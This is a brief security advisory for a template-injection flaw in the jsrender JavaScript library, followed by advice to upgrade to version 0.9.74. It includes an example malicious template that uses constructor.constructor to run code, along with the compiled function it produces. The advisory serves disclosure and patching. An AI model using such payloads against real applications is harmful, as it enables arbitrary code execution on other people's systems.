## Overview
Due to improper parsing, a malicious user is able to control input into jsrender's template can execute arbitrary code.

## Example input 
```
{{for ~x!=1?(constructor.constructor("return arguments.callee.caller")()):~y(10)}}
{{:#data}}
{{/for}}
```

## and output:
```
function anonymous(data,view,j,u) { // template var v,t=j._tag,ret="" +t("for",view,this,[ {view:view,tmpl:1, params:{args:['~x!=1?(constructor.constructor(\\"return arguments.callee.caller\\")()):    ~y(10)']}, args:[view.hlp("x")!=1?(data.constructor.constructor("return arguments.callee.caller")()):view.hlp("y")(10)], props:{}}]); return ret; }
```
 

## Recommendation
Upgrade to at least version 0.9.74

## References
https://github.com/BorisMoore/jsrender/commit/f984e139deb0a7648d5b543860ec652c21f6dcf6

